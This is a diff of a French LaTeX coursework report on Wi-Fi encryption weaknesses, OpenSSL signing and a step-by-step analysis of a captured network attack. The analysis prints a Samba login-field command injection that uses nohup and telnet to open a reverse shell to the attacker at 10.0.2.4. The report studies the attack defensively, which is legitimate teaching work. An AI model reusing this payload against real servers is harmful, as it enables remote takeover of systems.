@@ -15,7 +15,7 @@
 \null
 \newpage
 \tableofcontents
-\listoffigures
+
 \newpage
 \section{Wi-Fi}
 \subsection{Fonctionnement des trois algorithmes de chiffrement, points faibles et attaques possibles}
@@ -47,7 +47,7 @@ Une faiblesse au niveau du protocole TKIP a été découverte par des chercheurs
 On peut également nommer les différentes attaques existantes sur ce protocole :
 
 \begin{itemize}
-\item 	Attaque Beck & Tews
+\item 	Attaque Beck \& Tews
 \item 	Attaque par force brute
 \end{itemize}
 
@@ -63,7 +63,7 @@ Le WPA2 est basé sur l’algorithme AES (Advanced Encryption Standard). Cet alg
 
 En ce qui concerne les vulnérabilités du WPA2, l’algorithme AES n’a pas encore été cassé à part par le biais de la force brute.
 Certaines attaques existent sur des versions simplifiées d’AES, sur des versions où le nombre de tours est moins important.
-Des attaques ont également vu le jour sur la version complète de l’algorithme d’AES mais ces attaques ne font que réduire sensiblement le nombre d’opérations à effectuer par rapport à la méthode de la force brute (2^126 opérations contre 2^128 opérations pour une attaque par force brute).
+Des attaques ont également vu le jour sur la version complète de l’algorithme d’AES mais ces attaques ne font que réduire sensiblement le nombre d’opérations à effectuer par rapport à la méthode de la force brute (2\^{126} opérations contre 2\^{128} opérations pour une attaque par force brute).
 Il existe une vulnérabilité de ce protocole nommé « hole 196 » permettant d’intercepter et décrypter des communications sur le réseau, les voler ou bien s’introduire sur une machine et l’infecter. Cependant, la portée de cette faille est extrêmement limitée puisqu’il faut en pratique être un utilisateur déjà enregistré sur le réseau.
 
 On peut recenser les différentes attaques existantes sur ce protocole :
@@ -181,7 +181,7 @@ Pour signer le fichier, on exécute la commande suivante : \textit{rsautl -sign 
 \end{figure}
 
 Pour vérifier la signature, on exécute la commande suivante : \textit{rsautl -verify -pubin -inkey clePublique.pem -in fic.sig} (\textsc{Figure \ref{fig:verification}}). On obtient le résultat attendu. 
-    \begin{figure}[hbtp]
+    \begin{figure}[h!]
         \centering \includegraphics[scale=0.4]{Capture/question6c.png}
         \caption{Vérification de la signature}
          \label{fig:verification}
@@ -189,88 +189,88 @@ Pour vérifier la signature, on exécute la commande suivante : \textit{rsautl -
 \newpage
 \section{Attaque décortiquée}
 
-  \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/1.png}
+  \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/1.png}
         \caption{}
          \label{fig:1}
 \end{figure}
-
 Après s’être présenté sur le serveur, le hacker d’IP 10.0.2.4 demande au routeur cadmusCo l’adresse mac du serveur d’adresse IP 10.0.2.8. (\textsc{Figure \ref{fig:1}})
 
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/2.png}
+\vspace{1cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/2.png}
         \caption{}
          \label{fig:2}
 \end{figure}
-
 Ensuite il reçoit une réponse du routeur et obtient l’adresse mac  08:00:27:25:6a:fa du serveur.  (\textsc{Figure \ref{fig:2}})
 
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/3.png}
+\vspace{1cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/3.png}
         \caption{}
          \label{fig:3}
 \end{figure}
 
 Le hacker établit par la suite une connexion TCP avec le serveur. On le remarque par les flags [SYN], [SYN, ACK] et [ACK]. (\textsc{Figure \ref{fig:3}})
-
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/4.png}
+\vspace{2cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/4.png}
         \caption{}
          \label{fig:4}
 \end{figure}
 
 Le hacker fait alors une demande de protocole samba au serveur. (\textsc{Figure \ref{fig:4}})
-
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/5.png}
+\vspace{2cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/5.png}
         \caption{}
          \label{fig:5}
 \end{figure}
 
 Ce protocole est un protocole d’identification du nom de NT Lan Manager. (\textsc{Figure \ref{fig:5}})
-
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/6.png}
+\vspace{2cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/6.png}
         \caption{}
          \label{fig:6}
 \end{figure}
 
 Le hacker reçoit une réponse positive de la part du serveur et peut ensuite tenter de s’identifier sur le serveur.  (\textsc{Figure \ref{fig:6}})
-
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/7.png}
+\vspace{2cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/7.png}
         \caption{}
          \label{fig:7}
 \end{figure}
 
 Pour se connecter il rentre une ligne de commande particulière à la place du champ « user ».  (\textsc{Figure \ref{fig:7}})
-Cette ligne est /=`nohup sh -c '(sleep 4428|telnet 10.0.2.4 5002|while : ; do sh && break; done 2>&1|telnet 10.0.2.4 5002 >/dev/null 2>&1 &)'`
+Cette ligne est /=`nohup sh -c '(sleep 4428|telnet 10.0.2.4 5002|while : ; do sh \&\& break; done 2>\&1|telnet 10.0.2.4 5002 >/dev/null 2>\&1 \&)'`
 Elle permet de lancer un processus qui restera actif même après la déconnexion de l’utilisateur. Ce processus émule un Shell à distance, c’est-à-dire qu’il demande au serveur linux d’ouvrir un Shell sur la machine du hacker. Ceci a pour but de pouvoir exécuter des commandes saisies au clavier sur une machine distante. De plus, le hacker redirige toutes les sorties (Out, Erreurs) vers /dev/null.
-
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/8.png}
+\vspace{2cm}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=0.8]{Exo3/8.png}
         \caption{}
          \label{fig:8}
 \end{figure}
 
 Par la suite la machine se rend compte que le login rentré n’est pas bon et envoie donc une erreur d’identification. Cependant, il est trop tard car le hacker peut déjà exécuter des commandes sur le serveur par le biais du Shell qu’il a ouvert. (\textsc{Figure \ref{fig:8}})
 
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/9.png}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/9.png}
         \caption{}
          \label{fig:9}
 \end{figure}
 
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/10.png}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/10.png}
         \caption{}
          \label{fig:10}
 \end{figure}
 
 Ensuite le hacker exécute des commandes sur le terminal du serveur comme « echo t fulx627y7JxvLor; ». (\textsc{Figure \ref{fig:10}}) Le flag PSH indique le serveur doit absolument délivrer les données envoyées. (\textsc{Figure \ref{fig:9}})
 
- \begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/11.png}
+ \begin{figure}[h!]
+        \centering \includegraphics[scale=1]{Exo3/11.png}
         \caption{}
          \label{fig:11}
 \end{figure}
@@ -279,70 +279,70 @@ On peut voir ensuite que l’ordinateur du hacker se déconnecte du serveur car 
 
 Le hacker va alors s’adresser au serveur DHCP. Ce serveur DHCP va permettre de fournir une adresse IP au hacker arrivant sur le réseau et désirant communiquer et échanger avec lui.
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/12.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/12.png}
         \caption{}
          \label{fig:12}
 \end{figure}
 
 Il y a donc plusieurs trames qui sont envoyées. Le hacker va faire une requête auprès du serveur DHCP (\textsc{Figure \ref{fig:12}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/13.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/13.png}
         \caption{}
          \label{fig:13}
 \end{figure}
 
 Puis le serveur va émettre un paquet spécial de broadcast sur le réseau local 255.255.255.255  (\textsc{Figure \ref{fig:13}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/14.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/14.png}
         \caption{}
          \label{fig:14}
 \end{figure}
 
 Ensuite le hacker envoie une trame avec l’adresse 0.0.0.0 (car il n’a pas encore d’adresse IP) vers l’adresse de broadcast (DHCP Discover) pour demander une adresse IP  (\textsc{Figure \ref{fig:14}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/15.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/15.png}
         \caption{}
          \label{fig:15}
 \end{figure}
 
 En réponse à cette requête, le serveur DHCP va émettre une réponse proposant au hacker une adresse IP, le but étant de rendre le hacker apte à communiquer sur le réseau via cette adresse IP (\textsc{Figure \ref{fig:15}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/16.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/16.png}
         \caption{}
-         \label{fig:16}
+        \label{fig:16}
 \end{figure}
 
 Le hacker va alors sélectionner une des offres reçues et en informer le serveur DHCP. Le hacker demande au serveur la validation de cette adresse IP pour qu’il soit informé qu’elle n’est plus libre (\textsc{Figure \ref{fig:16}}).
-
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/17.png}
+\vspace{2cm}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/17.png}
         \caption{}
          \label{fig:17}
 \end{figure}
 
 Le serveur va confirmer la validation de l’adresse IP (\textsc{Figure \ref{fig:17}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/18.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/18.png}
         \caption{}
          \label{fig:18}
 \end{figure}
 
 Pour des raisons d’optimisation des ressources réseau, les adresses IP sont délivrées avec une date de début et une date de fin de validité. C’est ce qu’on appelle un « bail ». Ici, le hacker voit son bail arriver à terme et demande alors au serveur de prolonger celui-ci par un DHCP Request (\textsc{Figure \ref{fig:17}}).
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/19.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/19.png}
         \caption{}
          \label{fig:19}
 \end{figure}
 
-\begin{figure}[hbtp]
-        \centering \includegraphics[scale=0.4]{Exo3/20.png}
+\begin{figure}[h!]
+        \centering \includegraphics[scale=0.9]{Exo3/20.png}
         \caption{}
          \label{fig:20}
 \end{figure}
@@ -350,4 +350,6 @@ Pour des raisons d’optimisation des ressources réseau, les adresses IP sont d
 Puis le hacker exécute la commande « echo god is good » 
 
 
+\newpage
+\listoffigures
 \end{document}
